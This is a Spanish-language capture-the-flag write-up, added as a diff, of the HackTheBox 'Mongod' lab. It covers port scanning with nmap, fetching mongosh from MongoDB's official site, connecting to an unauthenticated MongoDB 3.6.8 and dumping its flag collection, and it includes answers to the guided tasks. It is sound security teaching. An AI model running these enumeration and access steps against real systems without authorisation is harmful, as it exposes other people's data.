@@ -1,0 +1,273 @@
+---
+titulo: "Mongod"
+plataforma: HackTheBox
+dificultad: Muy fácil
+so: Linux
+fecha: 2026-11-02
+tecnicas:
+  - Escaneo de puertos
+  - MongoDB
+  - Acceso sin contraseña
+resumen: "Máquina Linux con MongoDB en el puerto 27017, abierto sin control de acceso, que guarda la flag en una colección de su base de datos."
+serie:
+  nombre: Starting Point
+  tier: 0
+borrador: false
+---
+
+Máquina del Tier 0 de Starting Point. Las preguntas guiadas (tasks) de HackTheBox aparecen plegadas en la
+sección donde se responden: intenta contestarlas antes de abrirlas.
+
+<Ruta
+  titulo="Camino seguido en Mongod, de la conexión a la flag"
+  pasos={[
+    { titulo: 'ping', detalle: 'La máquina responde' },
+    { titulo: 'nmap -p-', detalle: '22/tcp y 27017/tcp abiertos' },
+    { titulo: 'nmap -sV', detalle: 'MongoDB 3.6.8' },
+    { titulo: 'mongosh', detalle: 'Descargado y conectado sin contraseña' },
+    { titulo: 'db.flag.find()', detalle: 'La flag, en sensitive_information', meta: true },
+  ]}
+/>
+
+> La IP `10.129.228.30` es la que tenía la máquina en mi sesión; a ti te saldrá otra.
+
+## Reconocimiento
+
+Lo primero es comprobar que llega la conexión con la máquina:
+
+<Cmd c="ping 10.129.228.30" notas={{ "10.129.228.30": "IP de la máquina objetivo." }} />
+
+Lo detengo con `Ctrl+C` y muestra el resumen:
+
+```text
+64 bytes from 10.129.228.30: icmp_seq=1 ttl=63 time=7.81 ms
+64 bytes from 10.129.228.30: icmp_seq=2 ttl=63 time=8.37 ms
+...
+^C
+--- 10.129.228.30 ping statistics ---
+6 packets transmitted, 6 received, 0% packet loss, time 5009ms
+```
+
+La máquina responde a todo: 6 paquetes enviados y 6 recibidos.
+
+## Enumeración
+
+### Puertos abiertos
+
+Mi primer escaneo fue `nmap sT 10.129.228.30`, sin el guion de la opción. Nmap no lo tomó como una opción
+sino como otro objetivo, e intentó resolverlo como nombre de host:
+
+```text
+Failed to resolve "sT".
+```
+
+Aun así escaneó la IP, y lo repetí bien escrito:
+
+<Cmd c="nmap -sT 10.129.228.30" notas={{ "10.129.228.30": "IP de la máquina objetivo." }} />
+
+```text
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+```
+
+Entre los 1000 puertos más comunes solo aparece el **22/tcp**, con SSH. Después escaneé todos los puertos:
+
+<Cmd
+  c="nmap -p- --open --min-rate 5000 10.129.228.30"
+  notas={{
+    "5000": "Al menos 5000 paquetes por segundo, para revisar los 65535 puertos en pocos segundos.",
+    "10.129.228.30": "IP de la máquina objetivo.",
+  }}
+/>
+
+En mi sesión escribí `-min-rate` con un solo guion y nmap lo aceptó igual; la forma que recoge la
+documentación es `--min-rate`. El escaneo terminó en menos de 4 segundos:
+
+```text
+Not shown: 65440 closed tcp ports (conn-refused), 93 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+27017/tcp open  mongod
+```
+
+Aparece un segundo puerto, el **27017/tcp**, que nmap asocia a `mongod`, el servidor de MongoDB (de ahí el
+nombre de la máquina). No está entre los 1000 que revisa por defecto, y por eso el primer escaneo no lo vio.
+
+<Pista titulo="Tarea 1 · ¿Cuántos puertos TCP están abiertos en la máquina?">
+  **2**: el 22 (SSH) y el 27017 (MongoDB).
+</Pista>
+
+### Versión de MongoDB
+
+Para saber qué hay exactamente detrás del 27017, uso la detección de versiones solo en ese puerto:
+
+<Cmd
+  c="nmap -sV -p 27017 10.129.228.30"
+  notas={{ "27017": "Solo se escanea el puerto de MongoDB.", "10.129.228.30": "IP de la máquina objetivo." }}
+/>
+
+```text
+PORT      STATE SERVICE VERSION
+27017/tcp open  mongodb MongoDB 3.6.8
+```
+
+<Pista titulo="Tarea 2 · ¿Qué servicio corre en el puerto 27017 de la máquina?">
+  **MongoDB 3.6.8**.
+</Pista>
+
+Según su documentación, MongoDB es una base de datos **de documentos**: guarda los datos como documentos
+parecidos a JSON (BSON) dentro de **colecciones**, y cada base de datos tiene una o varias colecciones. No
+usa tablas con filas y columnas como una base de datos relacional (SQL), así que es **NoSQL**.
+
+<Pista titulo="Tarea 3 · ¿Qué tipo de base de datos es MongoDB? (Elige: SQL o NoSQL)">
+  **NoSQL**.
+</Pista>
+
+## Acceso inicial
+
+### Conseguir mongosh
+
+Para hablar con el servidor se usa **mongosh**, el MongoDB Shell.
+
+<Pista titulo="Tarea 4 · ¿Qué comando se usa para abrir el shell interactivo de MongoDB desde el terminal?">
+  **mongosh**.
+</Pista>
+
+Pero en mi Pwnbox no estaba instalado. Probé a ejecutarlo, con y sin la dirección del servidor, y también
+`mongodb`:
+
+```text
+bash: mongosh: command not found
+```
+
+Así que descargué el paquete de mongosh para Linux desde la web de MongoDB:
+
+<Cmd
+  c="curl -O https://downloads.mongodb.com/compass/mongosh-2.3.2-linux-x64.tgz"
+  notas={{
+    "https://downloads.mongodb.com/compass/mongosh-2.3.2-linux-x64.tgz":
+      "Paquete de mongosh 2.3.2 para Linux de 64 bits, en el servidor de descargas de MongoDB.",
+  }}
+/>
+
+Con `-O` el fichero se guarda con el mismo nombre que tiene en el servidor, `mongosh-2.3.2-linux-x64.tgz`.
+Lo extraigo:
+
+<Cmd
+  c="tar -xvf mongosh-2.3.2-linux-x64.tgz"
+  notas={{ "mongosh-2.3.2-linux-x64.tgz": "Paquete de mongosh recién descargado." }}
+/>
+
+En mi sesión lo escribí como `tar xvf`, sin guion: es el estilo antiguo de las opciones de tar y GNU tar lo
+sigue aceptando, con el mismo significado. No hace falta `-z` aunque el fichero esté comprimido: al leerlo,
+GNU tar reconoce el formato solo. Con `-v` va mostrando lo que extrae:
+
+```text
+mongosh-2.3.2-linux-x64/
+...
+mongosh-2.3.2-linux-x64/bin/
+mongosh-2.3.2-linux-x64/bin/mongosh
+mongosh-2.3.2-linux-x64/bin/mongosh_crypt_v1.so
+```
+
+El programa está en `bin/`, así que entro en ese directorio:
+
+<Cmd
+  c="cd mongosh-2.3.2-linux-x64/bin"
+  notas={{ "mongosh-2.3.2-linux-x64/bin": "Directorio del paquete extraído donde está el ejecutable mongosh." }}
+/>
+
+### Conectarse a MongoDB
+
+Ahora sí lo ejecuto, pasándole el servidor en una cadena de conexión. Sin argumentos, mongosh se conectaría a
+`localhost:27017`, es decir, a la propia Pwnbox:
+
+<Cmd
+  c="./mongosh mongodb://10.129.228.30:27017"
+  notas={{
+    "mongodb://10.129.228.30:27017":
+      "Cadena de conexión: protocolo mongodb://, IP de la máquina objetivo y puerto de MongoDB.",
+  }}
+/>
+
+El `./` delante es necesario: mongosh no está instalado en ningún directorio del `PATH`, así que hay que
+decirle al shell dónde está. Entra directamente, **sin pedir usuario ni contraseña**:
+
+```text
+Connecting to:		mongodb://10.129.228.30:27017/?directConnection=true&appName=mongosh+2.3.2
+Using MongoDB:		3.6.8
+Using Mongosh:		2.3.2
+...
+** WARNING: Access control is not enabled for the database.
+**          Read and write access to data and configuration is unrestricted.
+...
+test>
+```
+
+El propio servidor avisa del problema: el **control de acceso no está activado**, así que cualquiera puede
+leer y modificar los datos. El prompt `test>` indica la base de datos en la que estoy: `test` es la que usa
+mongosh por defecto.
+
+La documentación actual de mongosh dice que se conecta a MongoDB 7.0 o superior, y este servidor es la 3.6.8.
+Aun así, en mi sesión mongosh 2.3.2 se conectó y todas las órdenes que usé funcionaron.
+
+### Buscar la flag
+
+Ya dentro, listo las bases de datos del servidor:
+
+```text
+test> show dbs
+admin                  32.00 KiB
+config                 72.00 KiB
+local                  72.00 KiB
+sensitive_information  32.00 KiB
+users                  32.00 KiB
+```
+
+<Pista titulo="Tarea 5 · ¿Qué comando lista todas las bases de datos del servidor MongoDB? (Sin el ; final)">
+  **show dbs**.
+</Pista>
+
+De las cinco, la que llama la atención es `sensitive_information`. Me cambio a ella con `use` y listo sus
+colecciones:
+
+```text
+test> use sensitive_information
+switched to db sensitive_information
+sensitive_information> show collections
+flag
+```
+
+<Pista titulo="Tarea 6 · ¿Qué comando lista las colecciones de una base de datos? (Sin el ; final)">
+  **show collections**.
+</Pista>
+
+Solo tiene una colección, `flag`. Para ver sus documentos se usa `db.flag.find()`: `db` es la base de datos
+actual, `flag` la colección y `find()` sin argumentos devuelve **todos** los documentos de la colección. En
+este caso hay uno solo, con dos campos: `_id` (el identificador que MongoDB pone a cada documento) y `flag`.
+
+<Pista titulo="Tarea 7 · ¿Qué comando vuelca el contenido de todos los documentos de la colección flag?">
+  **db.flag.find()**.
+</Pista>
+
+La flag no se publica: la tienes que conseguir tú.
+
+<Pista titulo="Flag · Envía la flag que está en la base de datos">
+  Es el valor del campo `flag` del único documento de la colección `flag`, en la base de datos
+  `sensitive_information`. Léelo con `db.flag.find()` desde mongosh, después de `use sensitive_information`.
+</Pista>
+
+## Escalada de privilegios
+
+No hace falta: la flag se lee directamente de la base de datos de MongoDB, sin llegar a tener una shell en la
+máquina.
+
+## Lecciones aprendidas
+
+- **Qué fallé:** escribí `nmap sT` sin el guion, y nmap lo tomó como un host. Después, mongosh no estaba en
+  Pwnbox y tuve que descargarlo y ejecutarlo desde su carpeta.
+- **Lo que enseña la máquina:** un MongoDB expuesto en la red sin control de acceso deja leer todas sus bases
+  de datos a cualquiera que llegue a su puerto. El propio servidor lo avisa al conectarse.
+- **Qué haré la próxima vez:** escanear todos los puertos con `-p-` desde el principio, y si falta un cliente,
+  bajarlo de la web oficial del proyecto en lugar de perder tiempo probando nombres de comandos.
